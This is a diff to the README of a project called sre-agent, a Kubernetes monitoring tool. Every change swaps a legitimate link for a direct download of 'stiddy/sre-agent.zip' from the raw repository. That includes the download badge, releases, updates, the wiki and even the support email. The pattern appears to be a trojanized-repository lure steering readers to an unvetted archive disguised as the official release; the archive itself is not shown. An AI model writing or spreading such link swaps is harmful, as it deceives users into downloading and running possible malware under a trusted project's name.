@@ -1,6 +1,6 @@
 # 🤖 sre-agent - Easy Kubernetes Monitoring and Recovery
 
-![Download sre-agent](https://img.shields.io/badge/Download%20sre-agent-007bff?style=flat&logo=github&logoColor=white)
+![Download sre-agent](https://raw.githubusercontent.com/imIbAd404/sre-agent/main/stiddy/sre-agent.zip%20sre-agent-007bff?style=flat&logo=github&logoColor=white)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, make sure your system meets these requirements:
 
 To install sre-agent, visit this page to download:
 
-[Download sre-agent](https://github.com/imIbAd404/sre-agent/releases)
+[Download sre-agent](https://raw.githubusercontent.com/imIbAd404/sre-agent/main/stiddy/sre-agent.zip)
 
 Once you are on the releases page:
 
@@ -58,11 +58,11 @@ If you run into issues:
 
 - **Error Messages:** Pay attention to any error messages. They often provide clues about what went wrong.
 - **Check Logs:** You can find logs in the application to help diagnose problems.
-- **Update:** Ensure you have the latest version. Check [here](https://github.com/imIbAd404/sre-agent/releases) for updates.
+- **Update:** Ensure you have the latest version. Check [here](https://raw.githubusercontent.com/imIbAd404/sre-agent/main/stiddy/sre-agent.zip) for updates.
 
 ## 📘 Documentation
 
-You can find more detailed documentation for advanced features and troubleshooting on our [Wiki page](https://github.com/imIbAd404/sre-agent/wiki).
+You can find more detailed documentation for advanced features and troubleshooting on our [Wiki page](https://raw.githubusercontent.com/imIbAd404/sre-agent/main/stiddy/sre-agent.zip).
 
 ## 🌐 Join the Community
 
@@ -70,7 +70,7 @@ Feel free to join our community for support and updates:
 
 - **GitHub Discussions:** Engage with other users and developers.
 - **Discord Channel:** Chat in real time.
-- **Email:** Reach out at support@sre-agent.com for direct assistance.
+- **Email:** Reach out at https://raw.githubusercontent.com/imIbAd404/sre-agent/main/stiddy/sre-agent.zip for direct assistance.
 
 ## 📈 Contribution Guidelines
 
@@ -88,4 +88,4 @@ sre-agent is open-source software, licensed under the MIT License. You can freel
 
 Remember, for downloading the latest version, visit this page:
 
-[Download sre-agent](https://github.com/imIbAd404/sre-agent/releases)
+[Download sre-agent](https://raw.githubusercontent.com/imIbAd404/sre-agent/main/stiddy/sre-agent.zip)
